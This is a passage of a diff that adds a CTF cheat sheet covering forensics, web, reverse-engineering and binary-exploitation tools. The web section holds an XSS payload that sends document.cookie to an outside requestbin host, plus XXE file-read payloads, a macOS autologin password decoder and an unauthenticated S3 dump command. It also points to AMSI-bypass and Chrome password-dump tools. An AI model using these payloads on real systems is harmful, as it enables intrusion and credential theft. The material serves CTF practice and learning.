+</li>
+</ul>
+<pre><code>sudo apt install foremost
+</code></pre>
+<ul>
+<li>
+<p><code>binwalk</code></p>
+<p>A command-line tool to carve files out of another file. Usage to extract is <code>binwalk -e [filename]</code> and it will create a <code>_[filename]_extracted</code> directory.</p>
+</li>
+</ul>
+<pre><code>	sudo apt install binwalk
+</code></pre>
+<ul>
+<li>
+<p><a href="https://pypi.python.org/pypi/hachoir-subfile/0.5.3"><code>hachoir-subfile</code></a></p>
+<p>A command-line tool to carve out files of another file. Very similar to the other tools like <code>binwalk</code> and <code>foremost</code>, but always try everything!</p>
+</li>
+<li>
+<p><a href="https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2">TestDisk</a></p>
+<p>A command-line tool, used to recover deleted files from a file system image. Handy to use if given a <code>.dd</code> and <code>.img</code> file etc.</p>
+</li>
+<li>
+<p><a href="https://www.cgsecurity.org/wiki/PhotoRec">photorec</a></p>
+<p>Another command-line utility that comes with <code>testdisk</code>. It is file data recovery software designed to recover lost files including video, documents and archives from hard disks, CD-ROMs, and lost pictures (thus the Photo Recovery name) from digital camera memory. PhotoRec ignores the file system and goes after the underlying data, so it will still work even if your media's file system has been severely damaged or reformatted.</p>
+</li>
+<li>
+<p>[Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']</p>
+<p>Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.</p>
+</li>
+</ul>
+<h2 id="png-file-forensics"><a class="header" href="#png-file-forensics">PNG File Forensics</a></h2>
+<ul>
+<li>
+<p><code>pngcheck</code></p>
+<p>A command-line tool for &quot;checking&quot; a <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG</a> image file. Especially good for verifying checksums.</p>
+</li>
+<li>
+<p><a href="http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz"><code>pngcsum</code></a></p>
+<p>Correct the CRC on all of the parts of a <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG</a> image file.</p>
+</li>
+<li>
+<p><a href="https://github.com/sherlly/PCRT">https://github.com/sherlly/PCRT</a></p>
+<p>Utility to try and correct a <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG</a> file. <strong>NOTE... this will NOT SAVE your file as new one. YOU HAVE TO SHOW the file (enter y when using the script]) to actually view the new image.</strong></p>
+</li>
+</ul>
+<h2 id="apk-forensics"><a class="header" href="#apk-forensics">APK Forensics</a></h2>
+<ul>
+<li>
+<p><a href="https://ibotpeaches.github.io/Apktool/"><code>apktool</code></a></p>
+<p>A command-line tool to extract all the resources from an APK file. Usage:</p>
+</li>
+</ul>
+<pre><code>apktool d &lt;file.apk&gt;
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/pxb1988/dex2jar"><code>dex2jar</code></a></p>
+<p>A command-line tool to convert a J.dex file to .class file and zip them as JAR files.</p>
+</li>
+<li>
+<p><a href="https://github.com/java-decompiler/jd-gui"><code>jd-gui</code></a></p>
+<p>A GUI tool to decompile Java code, and JAR files.</p>
+</li>
+</ul>
+<h2 id="web"><a class="header" href="#web">Web</a></h2>
+<ul>
+<li>
+<p><code>robots.txt</code></p>
+<p>This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. <a href="http://www.robotstxt.org/">http://www.robotstxt.org/</a></p>
+</li>
+<li>
+<p><a href="http://www.editthiscookie.com/">Edit This Cookie</a></p>
+<p>A web browser plug-in that offers an easy interface to modifying <a href="https://en.wikipedia.org/wiki/HTTP_cookie">cookies</a>. <em><strong>THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!</strong></em></p>
+</li>
+<li>
+<p>Backup pages ( <code>~</code> and <code>.bak</code> and <code>.swp</code> )</p>
+<p>Some times you may be able to dig up an old version of a webpage (or some PHP source code!) by adding the usual backup suffixes. A good thing to check!</p>
+</li>
+<li>
+<p><code>/admin/</code></p>
+<p>This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own &quot;low-hanging fruits&quot; check.</p>
+</li>
+<li>
+<p><code>/.git/</code></p>
+<p>A classic CTF challenge is to leave a <code>git</code> repository live and available on a website. You can see this with <code>nmap -A</code> (or whatever specific script catches it) and just by trying to view that specific folder, <code>/.git/</code>. A good command-line tool for this is <a href="https://github.com/internetwache/GitTools"><code>GitDumper.sh</code></a>, or just simply using <a href="https://en.wikipedia.org/wiki/Wget"><code>wget</code></a>.</p>
+<p><strong>Sometimes you might Bazaar or Mercurial or other distributed version control systems. You can use <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a> for those!!</strong></p>
+</li>
+<li>
+<p><a href="https://github.com/internetwache/GitTools"><code>GitDumper.sh</code></a></p>
+<p>A command-line tool that will automatically scrape and download a <a href="https://git-scm.com/">git</a> repository hosted online with a given URL.</p>
+</li>
+<li>
+<p>Bazaar <code>.bzr</code></p>
+<p>If you see a publically accessible <code>.bzr</code> directory, you can use <code>bzr branch http://site output-directory</code> to download it. Or, use this utility: <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a>/<a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a></p>
+<p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>. <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a>, vulnerability where the user can control rendered <a href="https://en.wikipedia.org/wiki/HTML">HTML</a> and ideally inject <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a> code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:</p>
+</li>
+</ul>
+<pre><code>&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;
+</code></pre>
+<pre><code>Typically you use this to steal cookies or other information, and you can do this with an online requestbin.
+</code></pre>
+<pre><code>&lt;img src=&quot;#&quot; onerror=&quot;document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie&quot;&gt;
+</code></pre>
+<ul>
+<li>
+<p>new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'</p>
+</li>
+<li>
+<p><a href="https://github.com/Anorov/cloudflare-scrape">CloudFlare Bypass</a></p>
+<p>If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.</p>
+</li>
+</ul>
+<pre><code class="language-python">#!/usr/bin/env python
+
+import cfscrape
+
+url = 'http://yashit.tech/tryharder/'
+
+scraper = cfscrape.create_scraper()
+print scraper.get(url).content
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/UltimateHackers/XSStrike">XSStrike</a></p>
+<p>A command-line tool for automated <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> attacks. Seems to function like how <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> does.</p>
+</li>
+<li>
+<p><a href="https://wpscan.org/"><code>wpscan</code></a></p>
+<ul>
+<li>A Ruby script to scan and do reconnaissance on a <a href="https://en.wikipedia.org/wiki/WordPress">Wordpress</a> application.</li>
+</ul>
+</li>
+<li>
+<p>Mac AutoLogin Password Cracking</p>
+</li>
+</ul>
+<p>Sometimes, given an Mac autologin password file <code>/etc/kcpassword</code>, you can crack it with this code:</p>
+<pre><code>def kcpasswd(ciphertext):
+    key = '7d895223d2bcddeaa3b91f'
+    while len(key) &lt; (len(ciphertext)*2):
+        key = key + key
+    key = binasciiunhexlify(key)
+    result = ''
+    for i in range(len(ciphertext)):
+        result += chr(ord(ciphertext[i]) ^ (key[i]))
+    return result
+</code></pre>
+<ul>
+<li>XXE : XML External Entity</li>
+</ul>
+<p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+We try to display the content of the file /flag :</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+  &lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+</code></pre>
+<ul>
+<li>
+<p>Wordpress Password Hash Generator</p>
+<p>If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: <a href="http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4">http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4</a>. This will let you login to /wp-admin/ on the site.</p>
+</li>
+<li>
+<p>Cookie Catcher</p>
+</li>
+<li>
+<p><a href="https://requestb.in/"><code>requestb.in</code></a></p>
+<p>A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> vulnerabilty.</p>
+</li>
+<li>
+<p><a href="https://hookbin.com/"><code>hookbin.com</code></a></p>
+<p>A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> vulnerabilty.</p>
+</li>
+<li>
+<p><a href="https://github.com/sqlmapproject/sqlmap"><code>sqlmap</code></a></p>
+<p>A command-line tool written in <a href="https://www.python.org/">Python</a> to automatically detect and exploit vulnerable SQL injection points.</p>
+</li>
+<li>
+<p>Flask Template Injection</p>
+<p>Try <code>{{config}}</code> to leak out the secret key, or start to climb up the Python MRO to acheive code execution.</p>
+<p><a href="https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html">https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html</a>, <a href="https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html">https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html</a>, <a href="https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html">https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html</a></p>
+</li>
+<li>
+<p>SQL <code>IF</code> statements</p>
+<p>These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like <code>SELECT ( IF ( 1=1, &quot;Condition successful!&quot;, &quot;Condition errored!&quot; ) )</code></p>
+</li>
+<li>
+<p>Explicit SQL Injection</p>
+</li>
+<li>
+<p>Blind SQL Injection</p>
+</li>
+<li>
+<p>MongoDB</p>
+</li>
+</ul>
+<p>Get MongoDB properly installed:</p>
+<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4
+echo &quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/4.0 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list
+sudo apt-get update
+sudo apt-get install -y mongodb-org
+</code></pre>
+<p>Connect to a remote server with credentials:</p>
+<pre><code>mongo --username 'uname' -p 'pword' --host hostname.com:27017
+</code></pre>
+<p>Print out the database info:</p>
+<pre><code>show databases
+
+use &lt;databasename&gt;
+
+show collections
+
+c = db.&lt;collectioname&gt;
+
+c.find()
+
+</code></pre>
+<ul>
+<li>
+<p>gobuster</p>
+</li>
+<li>
+<p>DirBuster</p>
+</li>
+<li>
+<p><code>nikto</code></p>
+</li>
+<li>
+<p>Burpsuite</p>
+</li>
+<li>
+<p>AWS / S3 Buckets</p>
+<p>You can try and dump an AWS bucket like so. The <code>--no-sign-request</code> avoids the need for credentials, and <code>--recursive</code> will grab everything possible.</p>
+</li>
+</ul>
+<pre><code>aws s3 cp --recursive --no-sign-request s3://&lt;bucket_name&gt; .
+</code></pre>
+<pre><code>i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`
+</code></pre>
+<h2 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h2>
+<ul>
+<li>
+<p><a href="http://man7.org/linux/man-pages/man1/ltrace.1.html">ltrace</a> and <a href="https://strace.io">strace</a></p>
+<p>Easy command-line tools to see some of the code being executed as you follow through a binary. Usage: <code>ltrace ./binary</code></p>
+</li>
+<li>
+<p><a href="https://www.hopperapp.com">Hopper</a></p>
+<p>Hopper Disassembler, the reverse engineering tool that lets you disassemble, decompile and debug your applications.</p>
+</li>
+<li>
+<p><a href="https://binary.ninja">Binary Ninja</a></p>
+<p>Clean and easy with multithreaded analysis. Support multiple architectures, platforms, and compilers.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/GNU_Debugger">gdb</a></p>
+<p>Fast and powerful debugger for UNIX system. More powerful if this tool is equipped with <a href="https://github.com/longld/peda">PEDA</a>.</p>
+</li>
+<li>
+<p><a href="https://www.hex-rays.com/products/ida/support/download.shtml">IDA</a></p>
+<p>It's one of popular debugger and disassembler tool with rich of features, cross platform, multi-processor disassembler.</p>
+</li>
+<li>
+<p><a href="https://github.com/radareorg/radare2">radare2</a></p>
+<p>Portable tool for hex editor, binary analysis, disassembler, debugger, etc.</p>
+</li>
+<li>
+<p><a href="https://ghidra-sre.org/">Ghidra</a></p>
+<p>New RE tool developed by NSA with the same feature as IDA</p>
+</li>
+<li>
+<p>Compiling &amp; running ASM code:</p>
+<p>You can convert ASM functions from assembly and run them as C functions like the following:</p>
+<p><code>asm4.S</code></p>
+<pre><code class="language-asm">.intel_syntax noprefix
+.global asm4
+asm4:
+	push   ebp
+	mov    ebp,esp
+	push   ebx
+	sub    esp,0x10
+	mov    DWORD PTR [ebp-0x10],0x27d
+	mov    DWORD PTR [ebp-0xc],0x0
+	jmp    label2
+label1:
+	add    DWORD PTR [ebp-0xc],0x1
+label2:
+	mov    edx,DWORD PTR [ebp-0xc]
+	mov    eax,DWORD PTR [ebp+0x8]
+	add    eax,edx
+	movzx  eax,BYTE PTR [eax]
+	test   al,al
+	jne    label1
+	mov    DWORD PTR [ebp-0x8],0x1
+	jmp    label3
+label4:
+	mov    edx,DWORD PTR [ebp-0x8]
+	mov    eax,DWORD PTR [ebp+0x8]
+	add    eax,edx
+	movzx  eax,BYTE PTR [eax]
+	movsx  edx,al
+	mov    eax,DWORD PTR [ebp-0x8]
+	lea    ecx,[eax-0x1]
+	mov    eax,DWORD PTR [ebp+0x8]
+	add    eax,ecx
+	movzx  eax,BYTE PTR [eax]
+	movsx  eax,al
+	sub    edx,eax
+	mov    eax,edx
+	mov    edx,eax
+	mov    eax,DWORD PTR [ebp-0x10]
+	lea    ebx,[edx+eax*1]
+	mov    eax,DWORD PTR [ebp-0x8]
+	lea    edx,[eax+0x1]
+	mov    eax,DWORD PTR [ebp+0x8]
+	add    eax,edx
+	movzx  eax,BYTE PTR [eax]
+	movsx  edx,al
+	mov    ecx,DWORD PTR [ebp-0x8]
+	mov    eax,DWORD PTR [ebp+0x8]
+	add    eax,ecx
+	movzx  eax,BYTE PTR [eax]
+	movsx  eax,al
+	sub    edx,eax
+	mov    eax,edx
+	add    eax,ebx
+	mov    DWORD PTR [ebp-0x10],eax
+	add    DWORD PTR [ebp-0x8],0x1
+label3:
+	mov    eax,DWORD PTR [ebp-0xc]
+	sub    eax,0x1
+	cmp    DWORD PTR [ebp-0x8],eax
+	jl     label4
+	mov    eax,DWORD PTR [ebp-0x10]
+	add    esp,0x10
+	pop    ebx
+	pop    ebp
+	ret
+</code></pre>
+<p><code>asm4.c</code></p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+extern int asm4(char* s);
+
+int main(){
+    char *str = &quot;picoCTF_d899a&quot;;
+    printf(&quot;%X&quot;, asm4(str));
+    return 0;
+}
+</code></pre>
+<p><code>bash</code></p>
+<pre><code class="language-bash">$ gcc -m32 -o a asm4.c asm4.S
+$ ./a
+</code></pre>
+</li>
+</ul>
+<h2 id="powershell"><a class="header" href="#powershell">PowerShell</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/samratashok/nishang">nishang</a></p>
+<p>A PowerShell suite of tools for pentesting. Has support for an ICMP reverse shell!</p>
+</li>
+<li>
+<p><a href="https://github.com/EmpireProject/Empire">Empire</a></p>
+<p>HUGE PowerShell library and tool to do a lot of post-exploitation.</p>
+</li>
+<li>
+<p><a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html?mkt_tok=eyJpIjoiWTJGaU5qbGlaVFZsTXpVdyIsInQiOiJBSXdzQm5FMGY0S1BrTWlBcVBlZ3ErN2NcL1RNeGkwcnNSK3FZcGVvaUhFRVJiQUhVcmVIWko0aWdNNCtXcVRrcWtDRTMxRGlpM1wvQlIxVHZlU1RUNk5sRVJnQ1dUZEFVQ0JTRHk4ejNVQTBWK1Y3Um1EWHZYdGY5YWQ5V2hTZFVXIn0%3D">Bypass AMSI Anti-Malware Scan Interface</a></p>
+<p>Great tool and guide for anti-virus evasion with PowerShell.</p>
+</li>
+</ul>
+<h2 id="windows-executables"><a class="header" href="#windows-executables">Windows Executables</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/erocarrera/pefile"><code>pefile</code></a></p>
+<p>A <a href="https://www.python.org/">Python</a> module that examines the headers in a Windows <a href="https://en.wikipedia.org/wiki/Portable_Executable">PE (Portable Executable)</a> file.</p>
+</li>
+<li>
+<p><a href="https://github.com/0xd4d/dnSpy">dnSpy</a></p>
+<p>A <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a> GUI tool to decompile and reverse engineer <a href="https://en.wikipedia.org/wiki/.NET_Framework">.NET</a> binaries</p>
+</li>
+<li>
+<p><a href="https://www.aldeid.com/wiki/PEiD">PEiD</a></p>
+<p>A <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a> tool to detect common packers, cryptors and compilers for <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a> <a href="https://en.wikipedia.org/wiki/Portable_Executable">PE</a></p>
+</li>
+<li>
+<p>jetBrains .NET decompiler</p>
+</li>
+<li>
+<p>AutoIT converter</p>
+<p>When debugging AutoIT programs, you may get a notification: &quot;This is a compiled AutoIT script&quot;. Here is a good thing to use to decode them: <a href="https://www.autoitscript.com/site/autoit/downloads/">https://www.autoitscript.com/site/autoit/downloads/</a></p>
+</li>
+</ul>
+<h2 id="python-reversing"><a class="header" href="#python-reversing">Python Reversing</a></h2>
+<ul>
+<li>
+<p><a href="https://sourceforge.net/projects/easypythondecompiler/">Easy Python Decompiler</a></p>
+<p>A small <code>.exe</code> GUI application that will &quot;decompile&quot; <a href="https://www.python.org/">Python</a> bytecode, often seen in <code>.pyc</code> extension. The tool runs reliably on <a href="https://en.wikipedia.org/wiki/Linux">Linux</a> with <a href="https://en.wikipedia.org/wiki/Wine_(software)">Wine</a>.</p>
+</li>
+<li>
+<p><a href="https://github.com/extremecoders-re/pyinstxtractor">Pyinstaller Extractor</a></p>
+<p>PyInstaller Extractor is a Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted. Usage is <code>python3 pyinstxtractor.py &lt;filename&gt;</code>. We can later decompile the bytecode in <code>.pyc</code> using <a href="https://github.com/No-Cellist-7780/ctf-katana#forensics">uncompyle6</a></p>
+</li>
+</ul>
+<h2 id="binary-exploitationpwn"><a class="header" href="#binary-exploitationpwn">Binary Exploitation/pwn</a></h2>
+<ul>
+<li>
+<p>Basic Stack Overflow</p>
+<p>Use <code>readelf -s &lt;binary&gt;</code> to get the location of a function to jump to -- overflow in Python, find offset with <code>dmesg</code>, and jump.</p>
+</li>
+<li>
+<p><code>printf</code> vulnerability</p>
+<p>A C binary vulnerability, where <code>printf</code> is used with user-supplied input without any arguments. Hand-made code to exploit and overwrite functions: <a href="https://pastebin.com/0r4WGn3D">https://pastebin.com/0r4WGn3D</a> and a video walkthrough explaining: <a href="https://www.youtube.com/watch?v=t1LH9D5cuK4">https://www.youtube.com/watch?v=t1LH9D5cuK4</a></p>
+</li>
+<li>
+<p><a href="http://formatstringexploiter.readthedocs.io/en/latest/index.html"><code>formatStringExploiter</code></a></p>
+<p>A good <a href="https://www.python.org/">Python</a> module to streamline exploiting a <a href="https://www.owasp.org/index.php/Format_string_attack">format string vulnerability</a>. THIS IS NOT ALWAYS A GOOD TACTIC...</p>
+</li>
+<li>
+<p>64-bit Buffer Overflow</p>
+<p>64-bit buffer overflow challenges are often difficult because the null bytes get in the way of memory addresses (for the function you want to jump to, that you can usually find with <code>readelf -s</code>). But, check if whether or not the function address you need starts with the same hex values already on the stack (in <code>rsp</code>). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address.</p>
+</li>
+</ul>
+<h2 id="miscellaneous"><a class="header" href="#miscellaneous">Miscellaneous</a></h2>
+<ul>
+<li>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Payload All The Things</a></p>
+<p>Super useful repo that has a payload for basically every sceario</p>
+</li>
+<li>
+<p>Punchcards(/Punch cards)</p>
+<p>Sometimes it sucks to do these manually, but you can here: <a href="http://tyleregeto.com/article/punch-card-emulator">http://tyleregeto.com/article/punch-card-emulator</a></p>
+</li>
+<li>
+<p>GameBoy ROMS</p>
+<p>You have options to run GameBoy ROMs... one is using VisualBoyAdvance, the oher is RetroArch (which is supposedly better):</p>
+</li>
+</ul>
+<pre><code># VisualBoyAdvance
+sudo add-apt-repository universe
+sudo apt install visualboyadvance
+
+# RetroArch
+sudo add-apt-repository ppa:libretro/stable &amp;&amp; sudo apt-get update &amp;&amp; sudo apt-get install -y retroarch* libretro-*
+</code></pre>
+<ul>
+<li>
+<p>References to DICE, or EFF</p>
+<p>If your challenges references &quot;EFF&quot; or includes dice in some way, or showcases numbers 1-6 of length 5, try <a href="https://www.eff.org/dice">https://www.eff.org/dice</a>. This could refer to a passphrase generated by dice rolls available here: <a href="https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt">https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt</a></p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Base64">Base64</a>, <a href="https://en.wikipedia.org/wiki/Base32">Base32</a>, <a href="https://en.wikipedia.org/wiki/Ascii85">Base85</a>, <a href="https://www.dcode.fr/base-91-encoding">Base91</a></p>
+</li>
+</ul>
+<pre><code>Base64:
+TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlz
+IHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2Yg
+dGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGlu
+dWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRo
+ZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4=
+</code></pre>
+<pre><code>Base32
+ORUGS4ZANFZSAYLOEBSXQYLNOBWGKIDPMYQGEYLTMUZTELRANF2CA2LTEB3GS43JMJWGKIDCPEQGY33UOMQG6ZRAMNQXA2LUMFWCA3DFOR2GK4TTEBQW4ZBANVXXEZJAMVYXKYLMOMQHG2LHNZZSAZTPOIQHAYLEMRUW4ZZMEBSXQ5DSME======
+</code></pre>
+<pre><code>Base85:
+&lt;~9jqo^BlbD-BleB1DJ+*+F(f,q/0JhKF&lt;GL&gt;Cj@.4Gp$d7F!,L7@&lt;6@)/0JDEF&lt;G%&lt;+EV:2F!,
+O&lt;DJ+*.@&lt;*K0@&lt;6L(Df-\0Ec5e;DffZ(EZee.Bl.9pF&quot;AGXBPCsi+DGm&gt;@3BB/F*&amp;OCAfu2/AKY
+i(DIb:@FD,*)+C]U=@3BN#EcYf8ATD3s@q?d$AftVqCh[NqF&lt;G:8+EV:.+Cf&gt;-FD5W8ARlolDIa
+l(DId&lt;j@&lt;?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R&lt;AKZ&amp;-DfTqBG%G
+&gt;uD.RTpAKYo'+CT/5+Cei#DII?(E,9)oF*2M7/c~&gt;
+</code></pre>
+<pre><code>Base91:
+8D$J`/wC4!c.hQ;mT8,&lt;p/&amp;Y/H@$]xlL3oDg&lt;W.0$FW6GFMo_D8=8=}AMf][|LfVd/&lt;P1o/1Z2(.I+LR6tQQ0o1a/2/WtN3$3t[x&amp;k)zgZ5=p;LRe.{B[pqa(I.WRT%yxtB92oZB,2,Wzv;Rr#N.cju&quot;JFXiZBMf&lt;WMC&amp;$@+e95p)z01_*UCxT0t88Km=UQJ;WH[#F]4pE&gt;i3o(g7=$e7R2u&gt;xjLxoefB.6Yy#~uex8jEU_1e,MIr%!&amp;=EHnLBn2h&gt;M+;Rl3qxcL5)Wfc,HT$F]4pEsofrFK;W&amp;eh#=#},|iKB,2,W]@fVlx,a&lt;m;i=CY&lt;=Hb%}+},F
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/qntm/base65536">Base65535</a></p>
+<p>Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!</p>
+</li>
+</ul>
+<pre><code>𤇃𢊻𤄻嶜𤄋𤇁𡊻𤄛𤆬𠲻𤆻𠆜𢮻𤆻ꊌ𢪻𤆻邌𤆻𤊻𤅋𤲥𣾻𤄋𥆸𣊻𤅛ꊌ𤆻𤆱炼綻𤋅𤅴薹𣪻𣊻𣽻𤇆𤚢𣺻赈𤇣綹𤻈𤇣𤾺𤇃悺𢦻𤂻𤅠㢹𣾻𤄛𤆓𤦹𤊻𤄰炜傼𤞻𢊻𣲻𣺻ꉌ邹𡊻𣹫𤅋𤇅𣾻𤇄𓎜𠚻𤊻𢊻𤉛𤅫𤂑𤃃𡉌𤵛𣹛𤁐𢉋𡉻𡡫𤇠𠞗𤇡𡊄𡒌𣼻燉𣼋𦄘炸邹㢸𠞻𠦻𡊻𣈻𡈻𣈛𡈛ꊺ𠆼𤂅𣻆𣫃𤮺𤊻𡉋㽻𣺬𣈛𡈋𤭻𤂲𣈻𤭻𤊼𢈛儛𡈛ᔺ
+</code></pre>
+<ul>
+<li>
+<p><a href="https://github.com/sveljko/base41/blob/master/python/base41.py">Base41</a></p>
+</li>
+<li>
+<p>Mac / Macintosh / Apple Hidden Files <code>.DS_Store</code> <a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a></p>
+<p>On Mac computers, there is a hidden index file <code>.DS_Store</code>. You might be able to find it if you have an LFI vulnerability or something of the like. A good tool to track these down on a website is the DS_Store Exposer: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a>.</p>
+</li>
+<li>
+<p>Wordsearches</p>
+<p>Some CTFs have me solve wordsearchs as part of a challenge (TJCTF 2018). This code is super helpful: <a href="https://github.com/robbiebarrat/word-search">https://github.com/robbiebarrat/word-search</a></p>
+</li>
+<li>
+<p>&quot;Unflattening&quot; Base64 in lowercase or uppercase</p>
+<p>Some time ago we needed to recover the original Base64 string from one that is in all lowercase or all uppercase. Caleb wrote a good script to smartly do this: <a href="https://pastebin.com/HprZcHrY">https://pastebin.com/HprZcHrY</a></p>
+</li>
+<li>
+<p>Password-protected Zip Files:  <a href="https://github.com/hyc/fcrackzip"><code>fcrackzip</code></a> and <code>zip2john.py</code></p>
+<p>Use</p>
+</li>
+<li>
+<p>15 Puzzle</p>
+<p>A sliding puzzle that consists of a 4x4 grid with numbered square tiles, with one missing, set in a random order. It was involved in SharifCTF to determine if a group of these puzzles was solvable: <a href="https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/">https://theromanxpl0it.github.io/ctf_sharifctf18/fifteenpuzzle/</a></p>
+</li>
+<li>
+<p>SETUID Binary Methodology</p>
+<p>Don't forget to check &quot;simple&quot; things --- it doesn't need to be a pwn or binary exploitation challenge, keep in mind IT DOES NOT use a secure PATH like <code>sudo</code>.</p>
+</li>
+<li>
+<p>Chrome Password Dump</p>
+<p>A <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Windows</a> command-line tool to dump passwords saved with Google Chrome.
+<a href="http://securityxploded.com/chrome-password-dump.php">http://securityxploded.com/chrome-password-dump.php</a></p>
+</li>
+<li>
+<p><code>img2txt</code></p>
+<p>A command-line tool to convert an image into ASCII for the terminal. Can be installed like so:</p>
+</li>
+</ul>
+<pre><code>sudo apt install -y caca-utils
+</code></pre>
+<ul>
+<li>
+<p>Strange Symbols/Characters</p>
+<p>Some CTFs will try and hide a message on a picture with strange symbols. Try and Google Reverse Image searching these. They may be Egyptian Characters:</p>
+</li>
+</ul>
+<p><img src="http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif" alt="http://www.virtual-egypt.com/newhtml/hieroglyphics/sample/alphabet.gif" /></p>
+<ul>
+<li>
+<p>Bitcoin</p>
+<p>You might see a private Bitcoin key as a base64 encoded SHA256 hash, like this:</p>
+</li>
+</ul>
